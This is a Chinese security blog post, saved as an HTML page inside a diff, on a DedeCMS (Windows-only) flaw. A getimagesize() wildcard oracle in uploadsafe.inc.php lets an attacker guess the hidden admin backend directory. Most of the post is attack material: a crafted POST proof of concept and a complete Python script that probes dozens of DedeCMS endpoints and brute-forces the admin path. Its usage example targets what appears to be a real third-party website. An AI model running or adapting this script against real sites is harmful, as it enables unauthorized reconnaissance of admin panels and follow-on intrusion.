@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Dedecms找后台一、漏洞简介仅针对windows系统 二、漏洞影响三、复现过程代码分析进入正题 首先看核心文件common.inc.php 大概148行左右 if($_FILES) &amp;#123;     require_once(DEDEINC.&#39;&#x2F;uploadsafe.inc.php&#39;); &amp;#125;  uploadsafe.inc.php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Dedecms/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Dedecms找后台一、漏洞简介仅针对windows系统 二、漏洞影响三、复现过程代码分析进入正题 首先看核心文件common.inc.php 大概148行左右 if($_FILES) &amp;#123;     require_once(DEDEINC.&#39;&#x2F;uploadsafe.inc.php&#39;); &amp;#125;  uploadsafe.inc.php">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/media/rId26.png">
+<meta property="article:published_time" content="2022-07-08T06:25:54.424Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Dedecms/Dedecms找后台" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Dedecms/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.424Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Dedecms找后台"><a href="#Dedecms找后台" class="headerlink" title="Dedecms找后台"></a>Dedecms找后台</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>仅针对windows系统</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>进入正题</p>
+<p>首先看核心文件common.inc.php 大概148行左右</p>
+<pre><code>if($_FILES)
+&#123;
+    require_once(DEDEINC.&#39;/uploadsafe.inc.php&#39;);
+&#125;
+</code></pre>
+<p>uploadsafe.inc.php</p>
+<pre><code>if( preg_match(&#39;#^(cfg_|GLOBALS)#&#39;, $_key) )
+&#123;
+    exit(&#39;Request var not allow for uploadsafe!&#39;);
+&#125;
+$$_key = $_FILES[$_key][&#39;tmp_name&#39;]; //获取temp_name 
+$&#123;$_key.&#39;_name&#39;&#125; = $_FILES[$_key][&#39;name&#39;];
+$&#123;$_key.&#39;_type&#39;&#125; = $_FILES[$_key][&#39;type&#39;] = preg_replace(&#39;#[^0-9a-z\./]#i&#39;, &#39;&#39;, $_FILES[$_key][&#39;type&#39;]);
+$&#123;$_key.&#39;_size&#39;&#125; = $_FILES[$_key][&#39;size&#39;] = preg_replace(&#39;#[^0-9]#&#39;,&#39;&#39;,$_FILES[$_key][&#39;size&#39;]);
+if(!empty($&#123;$_key.&#39;_name&#39;&#125;) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,$&#123;$_key.&#39;_name&#39;&#125;) || !preg_match(&quot;#\.#&quot;, $&#123;$_key.&#39;_name&#39;&#125;)) )
+&#123;
+    if(!defined(&#39;DEDEADMIN&#39;))
+    &#123;
+        exit(&#39;Not Admin Upload filetype not allow !&#39;);
+    &#125;
+&#125;
+if(empty($&#123;$_key.&#39;_size&#39;&#125;))
+&#123;
+    $&#123;$_key.&#39;_size&#39;&#125; = @filesize($$_key);
+&#125;
+$imtypes = array
+(
+    &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, 
+    &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot;
+);
+if(in_array(strtolower(trim($&#123;$_key.&#39;_type&#39;&#125;)), $imtypes))
+&#123;
+    $image_dd = @getimagesize($$_key); 
+    //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。
+    if (!is_array($image_dd))
+    &#123;
+        exit(&#39;Upload filetype not allow !&#39;);
+    &#125;
+&#125;
+......
+</code></pre>
+<p>注意$$_key这一句，变量$key取自于$_FILE，由于$<em>FILE可控自然$key也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现cfg</em>|GLOBALS。(但是应该还可以覆盖其他变量此处感觉还可以深挖)</p>
+<p>本人出发点是找个可以利用&lt;&lt;通配符猜解后台目录，所以只要$$_key参数可控就可以达到目的。</p>
+<p>但在这之前有个if(!defined(&#39;DEDEADMIN&#39;))的判断,这个很好绕过设置tmp_name为0或者1.jpg含.<br>就可以绕过。</p>
+<p>最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。</p>
+<p>当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype<br>not allow !</p>
+<p>举个例子</p>
+<pre><code>&lt;?php
+// ./dedecms/favicon.ico
+if(@getimagesize($_GET[&#39;poc&#39;]))&#123;
+    echo 1;
+&#125;else &#123;
+    echo 0;
+&#125;
+?&gt;
+get:
+http://localhost/test.php?poc=./d&lt;/favicon.ico
+返回：1
+
+http://localhost/test.php?poc=./a&lt;/favicon.ico
+返回：0
+
+http://localhost/test.php?poc=./de&lt;/favicon.ico
+返回：1
+
+http://localhost/test.php?poc=./ded&lt;/favicon.ico
+返回：1
+
+........
+</code></pre>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>构造poc</p>
+<pre><code>http://0-sec.org/tags.php
+
+post:
+
+dopost=save&amp;_FILES[b4dboy][tmp_name]=./de&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif
+</code></pre>
+<p>Common.inc.php<br>是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例</p>
+<p>当目录存在点时候</p>
+<p><img src="/resource/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/media/rId26.png"></p>
+<p>当目录不存在点时候</p>
+<h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><pre><code>#!/usr/bin/env python
+#coding:utf-8
+import requests
+import itertools
+from random import choice
+import sys
+
+characters = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!#@-&quot;
+back_dir = &quot;&quot;
+
+show_message = &#123;&#125;
+check_message = &#123;&#125;
+valid_file = []
+data = &#123;
+    &quot;_FILES[tools][tmp_name]&quot; : &quot;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;,
+    &quot;_FILES[tools][name]&quot; : 0,
+    &quot;_FILES[tools][size]&quot; : 0,
+    &quot;_FILES[tools][type]&quot; : &quot;image/gif&quot;
+&#125;
+
+headers = &#123;
+        
+                        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0&quot;,
+                    &quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,
+                    &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,
+                    &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,
+                    &quot;Connection&quot;:&quot;Close&quot;
+&#125;
+
+class Bute_Login:
+        global headers
+        def __init__(self,target):
+                self.target = target
+
+        def Check(self):
+                global data,check_message,valid_file
+                
+                File_Chek_List =[&#39;/tags.php&#39;,&#39;/include/vdimgck.php&#39;,&#39;/m/list.php&#39;,&#39;/m/view.php&#39;,&#39;/member/config.php&#39;,&#39;/plus/advancedsearch.php&#39;,
+                                  &#39;/plus/arcmulti.php&#39;,&#39;/plus/bookfeedback.php&#39;,&#39;/plus/bookfeedback_js.php&#39;,&#39;/plus/car.php&#39;,&#39;/plus/carbuyaction.php&#39;,
+                                  &#39;/plus/comments_frame.php&#39;,&#39;/plus/count.php&#39;,&#39;/plus/digg_ajax.php&#39;,&#39;/plus/digg_frame.php&#39;,&#39;/plus/digg_frame.php&#39;,
+                                     &#39;/plus/disdls.php&#39;,&#39;/plus/diy.php&#39;,&#39;/plus/download.php&#39;,&#39;/plus/erraddsave.php&#39;,
+                                     &#39;/plus/feedback.php&#39;,&#39;/plus/feedback_ajax.php&#39;,&#39;/plus/flink.php&#39;,&#39;/plus/flink.php&#39;,&#39;/plus/flink_add.php&#39;,
+                                     &#39;/plus/freelist.php&#39;,&#39;/plus/heightsearch.php&#39;,&#39;/plus/list.php&#39;,&#39;/plus/mytag_js.php&#39;,
+                                     &#39;/plus/posttocar.php&#39;,&#39;/plus/qrcode.php&#39;,&#39;/plus/recommend.php&#39;,&#39;/plus/rss.php&#39;,&#39;/plus/search.php&#39;,&#39;/plus/showphoto.php&#39;,
+                                     &#39;/plus/stow.php&#39;,&#39;/plus/view.php&#39;,&#39;/plus/vote.php&#39;,&#39;/special/index.php&#39;]
+                for filename in File_Chek_List:
+                        try:
+                                res = requests.post(self.target+filename,data=data)
+                                #print self.target+filename+&quot;---&gt;&quot;+res.text
+                                if &quot;Upload filetype not allow !&quot; in res.text and res.status_code == 200:
+                                        valid_file.append(filename)
+                        except:
+                                pass
+                #print valid_file
+                #print valid_file
+                if len(valid_file):
+                        if &quot;/tags.php&quot; in valid_file:
+                                for i in valid_file:
+                                        if i == &quot;/tags.php&quot;:
+                                                return i
+                        else:
+                                file_name = choice(valid_file)
+                                return file_name
+                else:
+                        return False
+
+        def Bute(self):
+                f_name = self.Check()
+                #print f_name
+                if f_name != False:
+                        if f_name == &quot;/tags.php&quot;:
+                                prefix = &quot;./&quot;
+                        else:
+                                prefix = &quot;./../&quot;
+                        flag = 0
+                        global characters,back_dir,data,check_message
+                        for num in range(1,7):        
+                                if flag:
+                                        break
+                                for pre in itertools.permutations(characters,num):
+                                        pre = &#39;&#39;.join(list(pre))
+                                        data[&quot;_FILES[tools][tmp_name]&quot;] = data[&quot;_FILES[tools][tmp_name]&quot;].format(p=pre)
+                                        print(&quot;testing&quot;,pre)
+                                        r = requests.post(self.target+f_name,data=data)
+                                        if &quot;Upload filetype not allow !&quot; not in r.text and r.status_code == 200:
+                                                flag = 1
+                                                back_dir = pre
+                                                data[&quot;_FILES[tools][tmp_name]&quot;] = &quot;%s&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;%prefix
+                                                break
+                                        else:
+                                                data[&quot;_FILES[tools][tmp_name]&quot;] = &quot;%s&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;%prefix
+                        #print(&quot;[+] 前缀为：&quot;,back_dir)
+                        flag = 0
+                        for i in range(30):
+                                if flag:
+                                        break
+                                for ch in characters:
+                                        if ch == characters[-1]:
+                                                flag = 1
+                                                break
+                                        data[&quot;_FILES[tools][tmp_name]&quot;] = data[&quot;_FILES[tools][tmp_name]&quot;].format(p=back_dir+ch)
+                                        r = requests.post(self.target+f_name, data=data)
+                                        if &quot;Upload filetype not allow !&quot; not in r.text and r.status_code == 200:
+                                                back_dir += ch
+                                                #print(&quot;[+] &quot;,back_dir)
+                                                data[&quot;_FILES[tools][tmp_name]&quot;] = &quot;%s&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;%prefix
+                                                break
+                                        else:
+                                                data[&quot;_FILES[tools][tmp_name]&quot;] = &quot;%s&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;%prefix
+                        show_message[&#39;Login_url&#39;] = self.target+&quot;/%s&quot;%back_dir
+                        
+                        print show_message
+                        return show_message
+                else:
+                        check_message[&#39;Enumerate&#39;] = False
+                        print check_message
+                        return check_message
+
+
+def main(url):
+        N = Bute_Login(url)
+        N.Bute()
+
+&#39;&#39;&#39;
+usage:        python .\dede_login.py -u [url]http://www.chuheautism.com[/url]
+output:
+                (&#39;testing&#39;, &#39;a&#39;)
+                (&#39;testing&#39;, &#39;b&#39;)
+                (&#39;testing&#39;, &#39;c&#39;)
+                &#123;&#39;Login_url&#39;: &#39;http://www.chuheautism.com/cha&#39;&#125;
+
+&#39;&#39;&#39;
+
+if __name__ == &#39;__main__&#39;:
+        if sys.argv[1] == &quot;-u&quot;:
+                main(sys.argv[2])
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Dedecms/Dedecms%E6%89%BE%E5%90%8E%E5%8F%B0/" data-id="cl5c2qnpc004gy8v1hrq0dvvp" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Dedecms/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88CVE-2018-20129%EF%BC%89Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Dedecms/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
